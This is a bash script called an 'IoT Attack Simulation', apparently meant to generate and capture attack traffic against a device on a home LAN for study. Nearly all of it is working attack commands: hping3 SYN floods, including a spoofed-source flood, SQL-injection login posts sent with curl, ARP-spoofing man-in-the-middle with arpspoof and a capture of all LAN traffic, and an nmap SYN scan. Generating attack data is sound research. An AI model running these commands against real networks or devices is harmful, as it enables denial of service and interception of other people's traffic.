
#!/bin/bash

IOT_IP="192.168.29.172"       # Replace with your IoT device IP
ROUTER_IP="192.168.29.1"      # Replace with your router IP
INTERFACE="eth0"
PCAP_FILE="attack_capture_$(date +%s).pcap"

echo "=========================="
echo " IoT Attack Simulation 🚨 "
echo "=========================="
echo "Target: $IOT_IP"
echo ""
echo "Select Attack Type:"
echo "1. DoS (SYN flood)"
echo "2. DDoS (spoofed IP flood)"
echo "3. Injection (HTTP POST fuzz)"
echo "4. MITM (ARP spoofing + full LAN capture)"
echo "5. Port Scan"
echo "6. Cancel"

read -p "Choose (1-6): " choice

if [ "$choice" == "6" ]; then
  echo "❌ Cancelled."
  exit 0
fi

# Only use host capture for non-MITM attacks
if [ "$choice" != "4" ]; then
  echo "🔴 Starting packet capture..."
  sudo tcpdump -i $INTERFACE -w "$PCAP_FILE" host $IOT_IP &
  TCPDUMP_PID=$!
  sleep 2
fi

case $choice in
  1)
    echo "⚡ Launching DoS attack (SYN flood)..."
    sudo hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood $IOT_IP
    ;;
  2)
    echo "⚔️  Launching DDoS-style spoofed SYN flood..."
    sudo hping3 --flood --rand-source -p 80 $IOT_IP
    ;;
  3)
    echo "💉 Launching HTTP Injection attempts..."
    for i in {1..50}; do
      curl -X POST http://$IOT_IP/ -d "user=' OR 1=1 --&pass=admin" >/dev/null 2>&1
    done
    ;;
  4)
    echo "🕵️ Launching ARP spoofing MITM..."
    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
    echo "🔴 Starting full LAN packet capture for 120 seconds..."
    sudo timeout 120s tcpdump -i $INTERFACE -w "$PCAP_FILE" net 192.168.29.0/24 &
    sleep 2
    xterm -hold -e "arpspoof -i $INTERFACE -t $IOT_IP $ROUTER_IP" &
    xterm -hold -e "arpspoof -i $INTERFACE -t $ROUTER_IP $IOT_IP" &
    echo "🛑 Let this run for about 2 minutes while interacting with the IoT device."
    echo "❗ Remember to manually stop ARP spoofing (Ctrl+C in both xterm windows)."
    echo "⏳ Waiting for capture to complete..."
    wait
    ;;
  5)
    echo "🔎 Launching Nmap Port Scan..."
    sudo nmap -sS -T4 -p 1-1000 $IOT_IP
    ;;
  *)
    echo "❌ Invalid choice. Exiting."
    kill $TCPDUMP_PID 2>/dev/null
    exit 1
    ;;
esac

if [ "$choice" != "4" ]; then
  echo "⏱️  Waiting 5 seconds before stopping capture..."
  sleep 5
  kill $TCPDUMP_PID 2>/dev/null
fi

echo "✅ Done! Traffic saved to: $PCAP_FILE"